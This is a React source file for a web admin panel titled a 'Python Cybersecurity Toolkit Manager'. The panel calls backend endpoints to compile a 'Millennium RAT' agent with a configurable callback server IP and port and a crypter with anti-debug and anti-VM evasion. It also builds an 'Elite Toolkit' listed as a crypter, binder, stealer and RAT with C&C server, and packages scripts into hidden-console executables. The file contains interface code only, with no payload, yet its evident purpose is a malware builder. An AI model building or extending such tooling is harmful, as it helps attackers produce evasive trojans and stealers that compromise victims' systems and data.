import { useState } from "react";
import { useMutation, useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { 
  Terminal, 
  Play, 
  Download, 
  FileCode, 
  Settings,
  CheckCircle,
  XCircle,
  Clock
} from "lucide-react";

export default function PythonToolkitManager() {
  const { toast } = useToast();
  const [activeTab, setActiveTab] = useState("millennium");
  const [millenniumConfig, setMillenniumConfig] = useState({
    serverIp: "127.0.0.1",
    serverPort: "8888",
    outputName: "millennium_agent",
    crypter: {
      enabled: true,
      antiDebug: true,
      antiVM: true,
      compression: true
    }
  });
  const [eliteConfig, setEliteConfig] = useState({
    outputDir: "elite_cybersecurity_toolkit"
  });
  const [buildConfig, setBuildConfig] = useState({
    scriptName: "",
    outputName: "",
    options: {
      onefile: true,
      windowed: false,
      noconsole: false,
      hiddenImports: ""
    }
  });
  const [executionOutput, setExecutionOutput] = useState("");

  // Get available Python tools
  const { data: toolsData } = useQuery({
    queryKey: ["/api/admin/python-tools"],
    refetchInterval: 30000, // Refresh every 30 seconds
  });

  // Millennium agent compilation
  const millenniumMutation = useMutation({
    mutationFn: async (config: typeof millenniumConfig) => {
      const response = await apiRequest("POST", "/api/admin/compile-millennium-agent", config);
      return response.json();
    },
    onSuccess: (data) => {
      setExecutionOutput(data.output || "");
      if (data.success) {
        toast({
          title: "Millennium Agent Compiled",
          description: `Agent created at: ${data.path}`,
        });
      } else {
        toast({
          title: "Compilation Failed",
          description: data.error || "Unknown error occurred",
          variant: "destructive",
        });
      }
    },
    onError: () => {
      toast({
        title: "Execution Error",
        description: "Failed to compile Millennium agent",
        variant: "destructive",
      });
    },
  });

  // Elite toolkit build
  const eliteMutation = useMutation({
    mutationFn: async (config: typeof eliteConfig) => {
      const response = await apiRequest("POST", "/api/admin/build-elite-toolkit", config);
      return response.json();
    },
    onSuccess: (data) => {
      setExecutionOutput(data.output || "");
      if (data.success) {
        toast({
          title: "Elite Toolkit Built",
          description: data.message || "Toolkit created successfully",
        });
      } else {
        toast({
          title: "Build Failed",
          description: data.error || "Unknown error occurred",
          variant: "destructive",
        });
      }
    },
    onError: () => {
      toast({
        title: "Execution Error",
        description: "Failed to build Elite toolkit",
        variant: "destructive",
      });
    },
  });

  // Executable build
  const buildMutation = useMutation({
    mutationFn: async (config: typeof buildConfig) => {
      const response = await apiRequest("POST", "/api/admin/build-executable", config);
      return response.json();
    },
    onSuccess: (data) => {
      setExecutionOutput(data.output || "");
      if (data.success) {
        toast({
          title: "Executable Built",
          description: data.message || "Executable created successfully",
        });
      } else {
        toast({
          title: "Build Failed",
          description: data.error || "Unknown error occurred",
          variant: "destructive",
        });
      }
    },
    onError: () => {
      toast({
        title: "Build Error",
        description: "Failed to build executable",
        variant: "destructive",
      });
    },
  });

  const handleMillenniumCompile = () => {
    millenniumMutation.mutate(millenniumConfig);
  };

  const handleEliteBuild = () => {
    eliteMutation.mutate(eliteConfig);
  };

  const handleExecutableBuild = () => {
    if (!buildConfig.scriptName) {
      toast({
        title: "Script Required",
        description: "Please select a script to build",
        variant: "destructive",
      });
      return;
    }
    buildMutation.mutate(buildConfig);
  };

  const formatFileSize = (bytes: number) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  const getExecutionStatus = () => {
    if (millenniumMutation.isPending || eliteMutation.isPending || buildMutation.isPending) {
      return { icon: Clock, color: "text-yellow-500", text: "EXECUTING" };
    }
    if (millenniumMutation.isSuccess || eliteMutation.isSuccess || buildMutation.isSuccess) {
      return { icon: CheckCircle, color: "text-green-500", text: "SUCCESS" };
    }
    if (millenniumMutation.isError || eliteMutation.isError || buildMutation.isError) {
      return { icon: XCircle, color: "text-red-500", text: "FAILED" };
    }
    return { icon: Terminal, color: "text-matrix", text: "READY" };
  };

  const status = getExecutionStatus();
  const StatusIcon = status.icon;

  return (
    <div className="space-y-6">
      <Card className="bg-terminal border-matrix">
        <CardHeader>
          <CardTitle className="text-matrix flex items-center gap-2">
            <Terminal className="w-5 h-5" />
            Python Cybersecurity Toolkit Manager
            <Badge className={`ml-auto ${status.color} bg-black/50 font-mono text-xs`}>
              <StatusIcon className="w-3 h-3 mr-1" />
              {status.text}
            </Badge>
          </CardTitle>
        </CardHeader>
        <CardContent>
          <Tabs value={activeTab} onValueChange={setActiveTab}>
            <TabsList className="bg-black border-matrix">
              <TabsTrigger value="millennium" className="text-matrix">Millennium RAT</TabsTrigger>
              <TabsTrigger value="elite" className="text-matrix">Elite Toolkit</TabsTrigger>
              <TabsTrigger value="build" className="text-matrix">EXE Builder</TabsTrigger>
              <TabsTrigger value="tools" className="text-matrix">Available Tools</TabsTrigger>
              <TabsTrigger value="output" className="text-matrix">Execution Output</TabsTrigger>
            </TabsList>

            <TabsContent value="millennium" className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="serverIp" className="text-matrix">Server IP</Label>
                  <Input
                    id="serverIp"
                    value={millenniumConfig.serverIp}
                    onChange={(e) => setMillenniumConfig(prev => ({ ...prev, serverIp: e.target.value }))}
                    className="bg-black border-matrix text-matrix"
                    placeholder="127.0.0.1"
                  />
                </div>
                <div>
                  <Label htmlFor="serverPort" className="text-matrix">Server Port</Label>
                  <Input
                    id="serverPort"
                    value={millenniumConfig.serverPort}
                    onChange={(e) => setMillenniumConfig(prev => ({ ...prev, serverPort: e.target.value }))}
                    className="bg-black border-matrix text-matrix"
                    placeholder="8888"
                  />
                </div>
              </div>

              <div>
                <Label htmlFor="outputName" className="text-matrix">Output Name</Label>
                <Input
                  id="outputName"
                  value={millenniumConfig.outputName}
                  onChange={(e) => setMillenniumConfig(prev => ({ ...prev, outputName: e.target.value }))}
                  className="bg-black border-matrix text-matrix"
                  placeholder="millennium_agent"
                />
              </div>

              <div className="space-y-2">
                <Label className="text-matrix flex items-center gap-2">
                  <Settings className="w-4 h-4" />
                  Crypter Options
                </Label>
                <div className="grid grid-cols-4 gap-4 p-4 border border-matrix/30 rounded">
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="crypterEnabled"
                      checked={millenniumConfig.crypter.enabled}
                      onChange={(e) => setMillenniumConfig(prev => ({ 
                        ...prev, 
                        crypter: { ...prev.crypter, enabled: e.target.checked }
                      }))}
                      className="text-matrix"
                    />
                    <Label htmlFor="crypterEnabled" className="text-matrix text-sm">Enable</Label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="antiDebug"
                      checked={millenniumConfig.crypter.antiDebug}
                      onChange={(e) => setMillenniumConfig(prev => ({ 
                        ...prev, 
                        crypter: { ...prev.crypter, antiDebug: e.target.checked }
                      }))}
                      disabled={!millenniumConfig.crypter.enabled}
                      className="text-matrix"
                    />
                    <Label htmlFor="antiDebug" className="text-matrix text-sm">Anti-Debug</Label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="antiVM"
                      checked={millenniumConfig.crypter.antiVM}
                      onChange={(e) => setMillenniumConfig(prev => ({ 
                        ...prev, 
                        crypter: { ...prev.crypter, antiVM: e.target.checked }
                      }))}
                      disabled={!millenniumConfig.crypter.enabled}
                      className="text-matrix"
                    />
                    <Label htmlFor="antiVM" className="text-matrix text-sm">Anti-VM</Label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="compression"
                      checked={millenniumConfig.crypter.compression}
                      onChange={(e) => setMillenniumConfig(prev => ({ 
                        ...prev, 
                        crypter: { ...prev.crypter, compression: e.target.checked }
                      }))}
                      disabled={!millenniumConfig.crypter.enabled}
                      className="text-matrix"
                    />
                    <Label htmlFor="compression" className="text-matrix text-sm">Compression</Label>
                  </div>
                </div>
              </div>

              <Button 
                onClick={handleMillenniumCompile} 
                disabled={millenniumMutation.isPending}
                className="w-full bg-matrix text-black hover:bg-matrix/80"
              >
                {millenniumMutation.isPending ? (
                  <>
                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin mr-2" />
                    Compiling Agent...
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4 mr-2" />
                    Compile Millennium Agent
                  </>
                )}
              </Button>
            </TabsContent>

            <TabsContent value="elite" className="space-y-4">
              <div>
                <Label htmlFor="eliteOutputDir" className="text-matrix">Output Directory</Label>
                <Input
                  id="eliteOutputDir"
                  value={eliteConfig.outputDir}
                  onChange={(e) => setEliteConfig(prev => ({ ...prev, outputDir: e.target.value }))}
                  className="bg-black border-matrix text-matrix"
                  placeholder="elite_cybersecurity_toolkit"
                />
              </div>

              <div className="p-4 border border-matrix/30 rounded bg-black/30">
                <h4 className="text-matrix font-mono mb-2">Elite Toolkit Components:</h4>
                <ul className="text-gray-400 text-sm space-y-1">
                  <li>• Advanced Crypter - File encryption and obfuscation</li>
                  <li>• Advanced Binder - Multi-file binding capabilities</li>
                  <li>• Advanced Stealer - System information gathering</li>
                  <li>• Advanced RAT - Remote access tool with C&C server</li>
                </ul>
              </div>

              <Button 
                onClick={handleEliteBuild} 
                disabled={eliteMutation.isPending}
                className="w-full bg-matrix text-black hover:bg-matrix/80"
              >
                {eliteMutation.isPending ? (
                  <>
                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin mr-2" />
                    Building Toolkit...
                  </>
                ) : (
                  <>
                    <Download className="w-4 h-4 mr-2" />
                    Build Elite Toolkit
                  </>
                )}
              </Button>
            </TabsContent>

            <TabsContent value="build" className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="scriptSelect" className="text-matrix">Select Script</Label>
                  <select
                    id="scriptSelect"
                    value={buildConfig.scriptName}
                    onChange={(e) => setBuildConfig(prev => ({ ...prev, scriptName: e.target.value }))}
                    className="w-full bg-black border border-matrix text-matrix rounded px-3 py-2"
                  >
                    <option value="">Choose a Python script...</option>
                    {toolsData?.tools?.map((tool: any) => (
                      <option key={tool.name} value={tool.name}>
                        {tool.name}
                      </option>
                    ))}
                  </select>
                </div>
                <div>
                  <Label htmlFor="executableName" className="text-matrix">Executable Name</Label>
                  <Input
                    id="executableName"
                    value={buildConfig.outputName}
                    onChange={(e) => setBuildConfig(prev => ({ ...prev, outputName: e.target.value }))}
                    className="bg-black border-matrix text-matrix"
                    placeholder="my_executable"
                  />
                </div>
              </div>

              <div className="space-y-4">
                <Label className="text-matrix flex items-center gap-2">
                  <Settings className="w-4 h-4" />
                  PyInstaller Options
                </Label>
                
                <div className="grid grid-cols-2 gap-4 p-4 border border-matrix/30 rounded">
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="onefile"
                      checked={buildConfig.options.onefile}
                      onChange={(e) => setBuildConfig(prev => ({ 
                        ...prev, 
                        options: { ...prev.options, onefile: e.target.checked }
                      }))}
                      className="text-matrix"
                    />
                    <Label htmlFor="onefile" className="text-matrix text-sm">One File</Label>
                  </div>
                  
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="windowed"
                      checked={buildConfig.options.windowed}
                      onChange={(e) => setBuildConfig(prev => ({ 
                        ...prev, 
                        options: { ...prev.options, windowed: e.target.checked }
                      }))}
                      className="text-matrix"
                    />
                    <Label htmlFor="windowed" className="text-matrix text-sm">Windowed</Label>
                  </div>
                  
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="noconsole"
                      checked={buildConfig.options.noconsole}
                      onChange={(e) => setBuildConfig(prev => ({ 
                        ...prev, 
                        options: { ...prev.options, noconsole: e.target.checked }
                      }))}
                      className="text-matrix"
                    />
                    <Label htmlFor="noconsole" className="text-matrix text-sm">No Console</Label>
                  </div>
                </div>

                <div>
                  <Label htmlFor="hiddenImports" className="text-matrix">Hidden Imports (comma-separated)</Label>
                  <Input
                    id="hiddenImports"
                    value={buildConfig.options.hiddenImports}
                    onChange={(e) => setBuildConfig(prev => ({ 
                      ...prev, 
                      options: { ...prev.options, hiddenImports: e.target.value }
                    }))}
                    className="bg-black border-matrix text-matrix"
                    placeholder="module1,module2,module3"
                  />
                </div>

                <div className="p-4 border border-matrix/30 rounded bg-black/30">
                  <h4 className="text-matrix font-mono mb-2">PyInstaller Build Options:</h4>
                  <ul className="text-gray-400 text-sm space-y-1">
                    <li>• <span className="text-matrix">One File:</span> Bundle everything into a single executable</li>
                    <li>• <span className="text-matrix">Windowed:</span> Do not provide a console window for standard I/O</li>
                    <li>• <span className="text-matrix">No Console:</span> Hide the console window (Windows only)</li>
                    <li>• <span className="text-matrix">Hidden Imports:</span> Manually specify modules PyInstaller might miss</li>
                  </ul>
                </div>
              </div>

              <Button 
                onClick={handleExecutableBuild} 
                disabled={buildMutation.isPending || !buildConfig.scriptName}
                className="w-full bg-matrix text-black hover:bg-matrix/80"
              >
                {buildMutation.isPending ? (
                  <>
                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin mr-2" />
                    Building Executable...
                  </>
                ) : (
                  <>
                    <Download className="w-4 h-4 mr-2" />
                    Build Executable
                  </>
                )}
              </Button>
            </TabsContent>

            <TabsContent value="tools" className="space-y-4">
              <div className="grid gap-4">
                {toolsData?.tools?.map((tool: any) => (
                  <Card key={tool.name} className="bg-black/50 border-matrix/30">
                    <CardContent className="p-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <FileCode className="w-5 h-5 text-matrix" />
                          <div>
                            <h4 className="text-matrix font-mono">{tool.name}</h4>
                            <p className="text-gray-400 text-sm">
                              {formatFileSize(tool.size)} • Modified: {new Date(tool.modified).toLocaleDateString()}
                            </p>
                          </div>
                        </div>
                        <Badge className="bg-matrix/20 text-matrix font-mono text-xs">
                          PYTHON
                        </Badge>
                      </div>
                    </CardContent>
                  </Card>
                )) || (
                  <div className="text-center py-8 text-gray-400">
                    <FileCode className="w-12 h-12 mx-auto mb-4 opacity-50" />
                    <p>No Python tools found</p>
                  </div>
                )}
              </div>
            </TabsContent>

            <TabsContent value="output" className="space-y-4">
              <div className="space-y-2">
                <Label className="text-matrix">Execution Output</Label>
                <ScrollArea className="h-[400px] w-full border border-matrix/30 rounded">
                  <Textarea
                    value={executionOutput}
                    readOnly
                    className="min-h-[390px] bg-black border-none text-green-400 font-mono text-sm resize-none"
                    placeholder="Script execution output will appear here..."
                  />
                </ScrollArea>
              </div>
              
              {executionOutput && (
                <Button
                  onClick={() => setExecutionOutput("")}
                  variant="outline"
                  className="border-matrix text-matrix hover:bg-matrix/10"
                >
                  Clear Output
                </Button>
              )}
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}